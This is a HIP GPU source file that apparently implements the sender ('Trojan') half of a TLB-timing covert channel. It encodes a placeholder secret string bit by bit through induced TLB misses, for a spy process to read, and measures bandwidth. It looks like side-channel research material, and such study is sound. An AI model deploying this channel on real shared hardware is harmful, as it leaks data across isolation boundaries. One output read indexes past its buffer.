#include "hip/hip_runtime.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "sync_utils.h"

// The secret message to be leaked
const char* secret_message = "This is a secret message!";

static int limits[SETS] = {0};
///////////////////////////////////////////////////////////////////////////////////////////////////
// GPU utility and driver functions

__global__ void Trojan (unsigned long *trojan, unsigned long *out, unsigned long* start, int its2, const char* message) {
    int b_id = blockIdx.x;
    int s_index = b_id * (BUCKETS / BLOCKS), t1 = 0, t2 = 0, i, k;
    unsigned long s1 = start[s_index], s2 = start[s_index + 1], s3 = start[s_index + 2];
    long long start_time, end_time, p, loop, duration;

    __shared__ unsigned long s_out;

    s_out = warmup (trojan, start + s_index + 1, 1, 2 * REPEAT);

    // Each thread block sends one character of the message
    char secret_char = message[b_id];
    if (secret_char == '\0') {
        // If the message is shorter than the number of blocks, send null bytes
        secret_char = 0;
    }

    for (k = 0; k < 8; k++) { // Send 8 bits for the character

        // Extract the k-th bit of the secret character
        int bit_to_send = (secret_char >> (7 - k)) & 1;

        p = s3;
        /* Encoding scheme:
           - To send a '0', we cause a TLB miss for the spy (high latency).
           - To send a '1', we do nothing, allowing a TLB hit for the spy (low latency).
        */
        if (bit_to_send == 0) {
            for (i = 0; i < its2 * REPEAT; i++) {
                p = trojan[p];
                t1 += p;
            }
            s_out += t1;
        }

        p = s1;
        start_time = clock ();
        for (i = 0; i < its2 * REPEAT; i++) {
            p = trojan[p];
            t1 += p;
        }
        end_time = clock ();
        s_out += t1;
        s_out += end_time - start_time;

        p = s2;
        loop = 0;
        do {
            start_time = clock();
            for (i = 0; i < its2 * REPEAT; i++) {
                p = trojan[p];
                t1 += p;
            }
            end_time = clock();
            s_out += t1;
            duration = (end_time - start_time)/(its2 * REPEAT);
            loop++;
        } while ((duration < LATENCY_THRESHOLD)/* && loop < ITER_LIMIT*/);
    }
    out[b_id * BITS_TO_SEND] = s_out;
}


void cmem_stride (const char* message) {

    hipError_t error_id;
    unsigned long e_size = sizeof (unsigned long);
    unsigned long a_size = (8 * GB) / e_size;
    unsigned long stride = (1 * MB) / e_size;

    hipSetDevice (DEVICE);
    unsigned long *d_trojan;
    error_id = hipMallocManaged ((void **) &d_trojan, e_size * a_size);
    if (error_id != hipSuccess) {
        printf ("Error 1.0 is %s\n", hipGetErrorString (error_id));
        return;
    }
    unsigned long *d_out;
     error_id = hipMallocManaged ((void **) &d_out, BLOCKS * BITS_TO_SEND * e_size);
    if (error_id != hipSuccess) {
        printf ("Error 1.0 is %s\n", hipGetErrorString (error_id));
        return;
    }
    unsigned long *s_trojan;
    error_id = hipMallocManaged ((void **) &s_trojan, e_size * (BUCKETS + 6));
    if (error_id != hipSuccess) {
        printf ("Error 1.0 is %s\n", hipGetErrorString (error_id));
        return;
    }

    create_pattern (d_trojan, a_size, stride, s_trojan, limits);

    dim3 block_trojan = dim3 (THREADS);
    dim3 grid_trojan = dim3 (BLOCKS, 1, 1);

    hipStream_t stream1, stream3;
    hipStreamCreate (&stream1);
    hipStreamCreate (&stream3);

    setPrefetchAsync (d_trojan, s_trojan, &stream1, /*SETS*/BUCKETS);

    hipStreamSynchronize (stream1);

    float t1;
    hipEvent_t start, end;
    hipEventCreate (&start);
    hipEventCreate (&end);

    Timer timer;
    int its = ITER;
    startTime (&timer);
    hipEventRecord (start, stream1);
    l_warmup<<<1, 1, 0, stream1>>>(d_trojan, s_trojan);
    Trojan<<<grid_trojan, block_trojan, 0, stream1>>> (d_trojan, d_out, s_trojan, its, message);

    hipEventRecord (end, stream1);
    hipEventSynchronize (end);
    stopTime (&timer);
    hipEventElapsedTime (&t1, start, end);

    float s = elapsedTime(timer);

    printf ("Res: %lu\n", d_out[BLOCKS * BITS_TO_SEND]);
    printf ("[END] %f ms, %f s, %f bps\n", t1, s, BLOCKS * BITS_TO_SEND/s);
    printf ("\n");
    hipFree (d_trojan);
    hipFree (s_trojan);
    hipFree (d_out);
}


int main (int argc, char **argv) {
    for (int i = 0; i < SETS; i++) {
        limits[i] = get_set_size (i);
        if (i + 1 < argc)
            limits[i] = (int) atoi (argv[i + 1]);
    }

    cmem_stride (secret_message);
    hipDeviceReset ();
    return 0;
}
